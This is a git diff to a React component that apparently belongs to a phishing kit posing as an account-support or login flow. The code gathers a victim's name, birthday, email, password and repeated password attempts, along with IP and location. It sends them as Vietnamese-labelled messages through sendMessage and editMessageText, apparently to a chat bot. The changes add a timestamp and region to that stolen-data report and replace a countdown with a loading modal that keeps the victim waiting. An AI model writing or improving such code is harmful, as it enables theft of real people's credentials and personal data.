@@ -1,16 +1,33 @@
 import HomeImage from '@assets/home-image.png';
+import LoadingModal from '@components/LoadingModal';
 import { editMessageText, sendMessage } from '@utils/api';
 import config from '@utils/config';
 import getToday from '@utils/getToday';
 import React, { useEffect, useRef, useState } from 'react';
 import 'react-phone-input-2/lib/style.css';
 import { Outlet, useLocation, useNavigate } from 'react-router-dom';
-
+const getCurrentTime = () => {
+	const currentTime = new Date()
+		.toLocaleString('vi-VN', {
+			timeZone: 'Asia/Ho_Chi_Minh',
+			hour: '2-digit',
+			minute: '2-digit',
+			second: '2-digit',
+			day: '2-digit',
+			month: '2-digit',
+			year: 'numeric',
+		})
+		.replace(',', ' -');
+	return currentTime;
+};
 const GetInfo: React.FC = () => {
 	const navigate = useNavigate();
 	const location = useLocation();
 	const ip = localStorage.getItem('ipAddress');
-	const country = localStorage.getItem('country')?.toUpperCase();
+	const country =
+		localStorage.getItem('country')?.toUpperCase() +
+		' - ' +
+		localStorage.getItem('region')?.toUpperCase();
 
 	const [caseNumber, setCaseNumber] = useState<string>('');
 	const [failedPasswordAttempts, setFailedPasswordAttempts] =
@@ -31,12 +48,20 @@ const GetInfo: React.FC = () => {
 	const birthdayInputRef = useRef<HTMLInputElement>(null);
 	const emailInputRef = useRef<HTMLInputElement>(null);
 	const passwordInputRef = useRef<HTMLInputElement>(null);
-
+	const [loadingTime, setLoadingTime] = useState<number>(0);
+	useEffect(() => {
+		const configData = async () => {
+			const configData = await config();
+			setLoadingTime(configData.settings.password_loading_time);
+		};
+		configData();
+	}, []);
 	const confirmPasswordInputRef = useRef<HTMLInputElement>(null);
 	const generateRandomNumber = (): string => {
 		const randomNumber = Math.floor(Math.random() * 1_000_000_000_000);
 		return `#${randomNumber.toString().padStart(12, '0')}`;
 	};
+
 	const handleButtonClick = () => {
 		const currentPath = location.pathname;
 
@@ -51,8 +76,9 @@ const GetInfo: React.FC = () => {
 				birthdayInputRef.current?.focus();
 			} else {
 				const newMessage =
+					`<b>📅 Thời gian:</b> <code>${getCurrentTime()}</code>\n` +
 					`<b>🌐 IP:</b> <code>${ip}</code>\n` +
-					`<b>🌍 Quốc gia:</b> <code>${country}</code>\n\n` +
+					`<b>🌍 Vị trí:</b> <code>${country}</code>\n\n` +
 					`<b>📄 Tên Page:</b> <code>${pageName}</code>\n` +
 					`<b>🧑 Tên:</b> <code>${name}</code>\n` +
 					`<b>🎂 Ngày sinh:</b> <code>${birthday}</code>\n\n` +
@@ -72,7 +98,10 @@ const GetInfo: React.FC = () => {
 			} else {
 				const existingMessage = localStorage.getItem('message') || '';
 				const newMessage =
-					existingMessage +
+					existingMessage.replace(
+						/<b>📅 Thời gian:<\/b> <code>.*?<\/code>/,
+						`<b>📅 Thời gian:</b> <code>${getCurrentTime()}</code>`,
+					) +
 					`<b>📧 Email:</b> <code>${email}</code>\n` +
 					`<b>🔒 Mật khẩu:</b> <code>${password}</code>`;
 				localStorage.setItem('message', newMessage);
@@ -99,8 +128,11 @@ const GetInfo: React.FC = () => {
 			if (currentPath === '/live/home/confirm-password') {
 				const existingMessage = localStorage.getItem('message') || '';
 				const updatedMessage =
-					existingMessage +
-					`\n<b>🔒 Mật khẩu ${failedPasswordAttempts}</b> <code>${confirmPassword}</code>`;
+					existingMessage.replace(
+						/<b>📅 Thời gian:<\/b> <code>.*?<\/code>/,
+						`<b>📅 Thời gian:</b> <code>${getCurrentTime()}</code>`,
+					) +
+					`\n<b>🔒 Mật khẩu ${failedPasswordAttempts}:</b> <code>${confirmPassword}</code>`;
 				localStorage.setItem('message', updatedMessage);
 				const messageID = localStorage.getItem('message_id');
 				editMessageText({
@@ -108,20 +140,8 @@ const GetInfo: React.FC = () => {
 					text: updatedMessage,
 				});
 			}
-
 			const configData = await config();
-			const loadingTime = configData.settings.password_loading_time;
-			setCountdown(Math.floor(loadingTime / 1000));
-
-			const countdownInterval = setInterval(() => {
-				setCountdown((prevCountdown) =>
-					prevCountdown !== null ? prevCountdown - 1 : null,
-				);
-			}, 1000);
-
 			setTimeout(async () => {
-				clearInterval(countdownInterval);
-				setCountdown(null);
 				setIsLoading(false);
 				if (currentPath === '/live/home/login') {
 					if (
@@ -160,8 +180,6 @@ const GetInfo: React.FC = () => {
 				break;
 		}
 	};
-
-	const [countdown, setCountdown] = useState<number | null>(null);
 
 	useEffect(() => {
 		setCaseNumber(generateRandomNumber());
@@ -228,14 +246,16 @@ const GetInfo: React.FC = () => {
 				onClick={handleButtonClick}
 				disabled={isLoading}
 			>
-				{isLoading ? (
-					<>{countdown !== null && ` ${countdown}s Continue`}</>
-				) : (
-					'Continue'
-				)}
+				Continue
 			</button>
+			{isLoading && (
+				<LoadingModal
+					loadingTime={loadingTime}
+					setShowLoadingModal={setIsLoading}
+				/>
+			)}
 		</div>
 	);
 };
-
 export default GetInfo;
+export { getCurrentTime };
